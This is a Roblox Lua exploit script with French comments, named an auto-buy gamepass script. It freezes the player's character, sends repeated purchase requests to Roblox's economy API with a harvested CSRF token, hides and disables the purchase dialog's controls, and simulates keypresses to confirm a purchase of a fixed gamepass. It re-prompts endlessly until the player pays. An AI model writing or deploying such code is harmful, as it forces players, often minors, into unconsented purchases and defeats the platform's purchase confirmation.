--[[
    Auto Buy Gamepass Script V18 (BOUTON BLEU PRÉCIS)
    
    COMPORTEMENT:
    - Freeze total au lancement
    - Vise le BOUTON BLEU (position ajustée vers le bas)
    - Achat forcé jusqu'à confirmation
]]

local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local GAMEPASS_ID = 1649271467
local isActive = true
local requestFunc = request or http_request or (http and http.request) or syn.request
local connections = {}

local function getBlueButtonPos()
    local screenSize = workspace.CurrentCamera.ViewportSize
    -- Position du bouton bleu "Acheter" (plus bas que le centre)
    -- Ajusté à 62% de la hauteur de l'écran
    return Vector2.new(screenSize.X / 2, screenSize.Y * 0.62)
end

local function tryWebBuy(productId, price, sellerId)
    if not requestFunc then return end
    task.spawn(function()
        local csrf
        for _, url in ipairs({"https://auth.roblox.com/v2/login", "https://economy.roblox.com/v2/user-products"}) do
            local r = requestFunc({Url = url, Method = "POST", Body = "{}"})
            if r and r.Headers then
                csrf = r.Headers["x-csrf-token"] or r.Headers["X-CSRF-TOKEN"]
                if csrf then break end
            end
        end
        if not csrf then return end
        
        for i = 1, 5 do
            requestFunc({
                Url = "https://economy.roblox.com/v1/purchases/products/" .. productId,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json", 
                    ["X-CSRF-TOKEN"] = csrf, 
                    ["Origin"] = "https://www.roblox.com", 
                    ["Referer"] = "https://www.roblox.com/"
                },
                Body = HttpService:JSONEncode({expectedCurrency=1, expectedPrice=price, expectedSellerId=sellerId})
            })
            task.wait(0.5)
        end
    end)
end

local function forcePrompt()
    pcall(function() MarketplaceService:PromptGamePassPurchase(LocalPlayer, GAMEPASS_ID) end)
end

local function freezeEverything()
    local char = LocalPlayer.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        if root then root.Anchored = true end
        if hum then 
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.JumpHeight = 0
        end
    end
end

local function unfreezeEverything()
    local char = LocalPlayer.Character
    if char then
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChild("Humanoid")
        if root then root.Anchored = false end
        if hum then 
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            hum.JumpHeight = 7.2
        end
    end
end

local function stopAll()
    isActive = false
    for _, conn in pairs(connections) do pcall(function() conn:Disconnect() end) end
    connections = {}
    unfreezeEverything()
end

local function startForce()
    freezeEverything()
    
    local s, i = pcall(function() return MarketplaceService:GetProductInfo(GAMEPASS_ID, Enum.InfoType.GamePass) end)
    if s and i then 
        tryWebBuy(i.ProductId, i.PriceInRobux, i.Creator.CreatorTargetId)
    end

    table.insert(connections, RunService.RenderStepped:Connect(function()
        if not isActive then return end
        
        freezeEverything()

        pcall(function()
            game:GetService("CoreGui").FoundationOverlay.ProductPurchaseModal.SheetContainer.Sheet.Content.Content:Destroy()

            for _, i in pairs(game:GetService("CoreGui").FoundationOverlay:GetDescendants()) do 
                if i.Name ~= "CloseAffordance" or i.Name == "1" and i:FindFirstChild("Text") and i.Parent.Name == "1" then
                    print(i.Name)
                    ConnectionActivated = getconnections(i.Activated)

                    for _, p in pairs(ConnectionActivated) do 
                        p:Disable()
                    end

                    MouseButtonOneClickActivated = getconnections(i.Activated)

                    for _, p in pairs(MouseButtonOneClickActivated) do 
                        p:Disable()
                    end
                end
            end
        end)
        task.wait(3)
        task.spawn(function()
            pcall(function()
                local GuiService = game:GetService("GuiService")

                local function toggleUiNavigationPermissions(newState)
                    GuiService.GuiNavigationEnabled = newState
                    GuiService.AutoSelectGuiEnabled = newState 
                    
                    if newState == false then
                        GuiService.SelectedObject = nil
                    end
                end
                print("Found")
                toggleUiNavigationPermissions(true)
                if game:GetService("CoreGui").FoundationOverlay.ProductPurchaseModal.SheetContainer.Sheet.Content.Actions["1"]:FindFirstChild("1") then
                    btn = game:GetService("CoreGui").FoundationOverlay.ProductPurchaseModal.SheetContainer.Sheet.Content.Actions["1"]["1"]
                else 
                    btn = game:GetService("CoreGui").FoundationOverlay.ProductPurchaseModal.SheetContainer.Sheet.Content.Actions["1"]
                end
                task.wait(0.1)
                btn.Selectable = true
                GuiService.SelectedObject = btn
                task.wait(0.1)
                VirtualInputManager = game:GetService("VirtualInputManager")
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                task.wait()
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            end)
        end)
    end))

    task.spawn(function()
        while isActive do
            forcePrompt()
            task.wait(0.3)
        end
    end)

    table.insert(connections, UserInputService.InputBegan:Connect(function(input)
        if isActive and input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.Backspace then
                forcePrompt()
            end
        end
    end))
end

MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, passId, wasPurchased)
    if player == LocalPlayer and passId == GAMEPASS_ID then
        if wasPurchased then
            stopAll()
        elseif isActive then
            task.wait(0.05)
            forcePrompt()
        end
    end
end)

forcePrompt()
task.wait(0.2)
startForce()